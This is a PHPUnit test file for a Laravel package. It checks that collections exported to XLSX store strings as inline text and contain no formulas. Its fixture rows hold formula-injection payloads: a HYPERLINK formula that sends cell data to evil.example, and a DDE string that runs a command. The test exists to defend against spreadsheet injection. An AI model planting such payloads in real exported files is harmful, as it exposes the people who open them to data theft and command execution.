<?php

namespace audunru\ExportResponse\Tests\Unit;

use audunru\ExportResponse\Tests\TestCase;
use Illuminate\Support\Facades\File;
use Illuminate\Support\LazyCollection;
use Illuminate\Testing\TestResponse;
use ZipArchive;

class CollectionToXlsxTest extends TestCase
{
    private const ROWS = [
        ['id' => 1, 'name' => '=HYPERLINK("https://evil.example/?x="&A1,"Click")', '=key' => 'Navn', 'amount' => -5, 'meta' => null],
        ['id' => 2, 'name' => "+cmd|' /C calc'!A0", '=key' => '=1+1', 'amount' => 10, 'meta' => null],
    ];

    public function test_it_writes_strings_as_text_cells()
    {
        $response = new TestResponse(collect(self::ROWS)->toXlsx('filename.xlsx'));

        $this->assertXlsxHasNoFormulasAndKeepsValues($response->streamedContent());
    }

    public function test_it_writes_strings_as_text_cells_from_lazy_collection()
    {
        $response = new TestResponse(LazyCollection::make(self::ROWS)->toXlsx('filename.xlsx'));

        $this->assertXlsxHasNoFormulasAndKeepsValues($response->streamedContent());
    }

    private function assertXlsxHasNoFormulasAndKeepsValues(string $content): void
    {
        $filename = tempnam(sys_get_temp_dir(), '');
        File::put($filename, $content);
        $zip = new ZipArchive;
        $zip->open($filename);
        $sheet = $zip->getFromName('xl/worksheets/sheet1.xml');
        $zip->close();

        $this->assertStringNotContainsString('<f>', $sheet);

        // Read the XML, because the openspout reader also converts strings that start with "=" into formulas
        foreach (['=key', '=HYPERLINK("https://evil.example/?x="&A1,"Click")', "+cmd|' /C calc'!A0", '=1+1'] as $value) {
            $this->assertStringContainsString('t="inlineStr"><is><t>'.htmlspecialchars($value, ENT_QUOTES).'</t></is>', $sheet);
        }
        $this->assertStringContainsString('<v>-5</v>', $sheet);
    }
}
